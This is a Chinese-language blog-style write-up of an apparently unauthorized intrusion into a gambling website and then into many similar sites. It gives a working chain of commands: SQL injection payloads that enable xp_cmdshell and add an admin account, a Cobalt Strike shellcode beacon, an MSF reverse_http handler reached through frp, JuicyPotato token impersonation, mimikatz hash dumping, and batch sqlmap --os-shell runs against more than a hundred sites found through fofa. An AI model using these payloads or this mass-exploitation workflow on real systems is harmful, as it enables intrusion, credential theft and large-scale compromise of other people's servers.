## 前言  

我们的小团队对偶然发现的bc站点进行的渗透,从一开始只有sqlmap反弹的无回显os-shell到CS上线,到配合MSF上传脏土豆提权,到拿下SYSTEM权限的过程,分享记录一下渗透过程

## 0x01:登录框sql注入

看到登录框没什么好说的,先试试sqlmap一把梭

![](../Images/698491f4236b8f25313c204b5e17d46b.png)

burp抓包登录请求,保存到文件直接跑一下试试

```


```
python3 sqlmap.py -r "2.txt"
```


```

有盲注和堆叠注入

![](../Images/b9900206c08d66d9bd191b18593c798e.png)

  

看看能不能直接用sqlmap拿shell

```


```
python3 sqlmap.py -r "2.txt" --os-shell
```


```

目测不行

![](../Images/68032177ffffe340089b72fbc892f5c3.png)

 提示的是`xp_cmdshell`未开启,由于之前扫出来有堆叠注入,尝试运用存储过程打开`xp_cmdshell`

Payload:

```


```
userName=admin';exec sp\_configure 'show advanced options', 1;RECONFIGURE;EXEC sp\_configure'xp\_cmdshell', 1;RECONFIGURE;WAITFOR DELAY '0:0:15' --&password=123
```


```

延时15秒,执行成功(如果没有堆叠注入就把每个语句拆开一句一句执行,效果理论上应该是一样的)

![](../Images/53d58eedd76ace183a017a657ffdd571.png)

顺便试试看直接用`xp_cmdshell`来加用户提权,构造payload(注意密码别设太简单,windows系统貌似对密码强度有要求,设太简单可能会失败)

```


```
userName=admin';exec xp\_cmdshell 'net user cmdshell Test ZjZ0ErUwPcxRsgG8E3hL /add';exec master..xp\_cmdshell 'net localgroup administrators Test /add';WAITFOR DELAY '0:0:15' --&password=123
```


```

nmap扫了一下,目标的3389是开着的,`mstsc.exe`直接连

没连上

![](../Images/69688c8f7c97f2365a9d435106e14b78.png)

  

再跑一下os-shell,发现能跑绝对路径了,好兆头

![](../Images/e14073ff80afde2850d1f914985186f7.png)

  

成功弹出shell  

![](../Images/e7d7d9196f27aa5f76d1c07b53d6f1d5.png)

  

因为是盲注,所以执行`whoami`之类的命令各种没回显,于是直接来个CS的shellcode

![](../Images/f1cd1547cbf45bb753e30242d9b6e402.png)

  

![](../Images/9099854833dc4ff61152b967b552ed87.png)

  

生成的shellcode直接粘贴进os-shell里回车

![](../Images/6a90501120dfccb7a522730553795bb9.png)

  

然后CS里啪的一下就上线了,很快啊.赶紧喊几个不讲武德的年轻人上线打牌

## 0x03:利用frp到CS服务端联动MSF攻击

在CS上开一个监听器

![](../Images/1a15a780965aba295d2454043c0de27d.png)

修改一下frp的配置文件

![](../Images/3d73aec7abdf466582cbb52b9e5af17e.png)

  

保存配置文件后在frp文件夹下启动frp

```


```
./frpc -c frpc.ini
```


```

![](../Images/439dc76ac5e5465a6b736c1abe414d47.png)

  

打开msf开启监听

```


```
use exploit/multi/handler
```

```
set payload windows/meterpreter/reverse\_http
```

```
set LHOST 127.0.0.1
```

```
set LPORT 9996
```

```
run
```


```

这里可以看到MSF已经开启监听了

![](../Images/5ab1af07ce42383a398944115b085969.png)

  

回到CS,右键选一个主机增加一个会话

## 0x04:上传烂土豆EXP提权

在本地准备好一个烂土豆的EXP(注意windows路径多加个斜杠,虽然也可以不加,但试了几台机子发现加了成功率高,不知道什么原理)

```


```
upload /root/EXP/JuicyPotato/potato.exe C:\\\\Users\\\\Public
```


```

  

![](../Images/8ce7c72c55466e0dc71c3bdf302a6482.png)

  

CS翻一下目标机器的文件,发现成功上传

![](../Images/6841a80a7e7709cffa5091ef2ff2d75b.png)

  

然后进目标机器的这个文件夹下开始准备提权

```


```
cd C:\\\\Users\\\\Public
```

```
use incognito
```

```
execute -cH -f ./potato.exe
```

```
list\_tokens -u
```

```
复制administrator的令牌
```

```
impersonate\_token "administrator的令牌"
```


```

  

![](../Images/e215c3928a441f6f7754ac193e1f6161.png)

  

最后检查一下是否提权成功

![](../Images/5d74e5a5cecd9c33a8e284d5f4c4e6dc.png)

  

## 0x05:mimikatz抓取密码hash

先提个权

```


```
getsystem
```


```

![](../Images/80094a44680d7b5b9ee6116898fdd844.png)

  

试试能不能直接dump出来

![](../Images/37ed0ca58c668551bec437e34388fce1.png)

  

不行,只好用mimikatz了

```


```
load mimikatz
```


```

然后抓取密码哈希

```


```
mimikatz\_command -f samdump::hashes
```


```

![](../Images/e259cbe7cfaaf9a1b6e6cee69c231829.png)

  

也可以用MSF自带的模块(这个比mimikatz慢一点)

```


```
run post/windows/gather/smart\_hashdump
```


```

![](../Images/9d46e54e9760cca8b9da1cbe8c7d7280.png)

然后丢到CMD5解密,如果是弱口令可以解出账户密码,这次运气比较好,是个弱口令,直接解出了密码,然后`mstsc.exe`直接连,成功上桌面

![](../Images/b11f089c86da1403b616ace78e3cc62c.png)

## 0x06:信息收集扩大攻击范围

成功获取到目标最高权限之后,尝试通过信息收集获取其他相类似的站点进行批量化攻击.

@crow师傅提取了该网站的CMS特征写了一个fofa脚本批量扫描,最终得到了1900+个站点

![](../Images/3d764358c993cad68a655ae7b7b5493a.png)

  

  

但由于bc站往往打一枪换一个地方,这些域名往往大部分是不可用的,因此需要再确认域名的存活状态,使用脚本最终得到了一百多个存活域名

  

![](../Images/906fea074e14103439c70e7f58df28cc.png)

  

在使用脚本批量访问带漏洞的URL,把生成的request利用多线程脚本批量发起请求去跑这个请求

```


```
python3 sqlmap.py -r "{0}" --dbms="Microsoft SQL Server" --batch --os-shell
```


```

最终得到可以弹出os-shell的主机,再通过手工注入shellcode,最终得到大量的上线主机

![](../Images/f082d52f03412a7e3016a88578ced6a9.png)
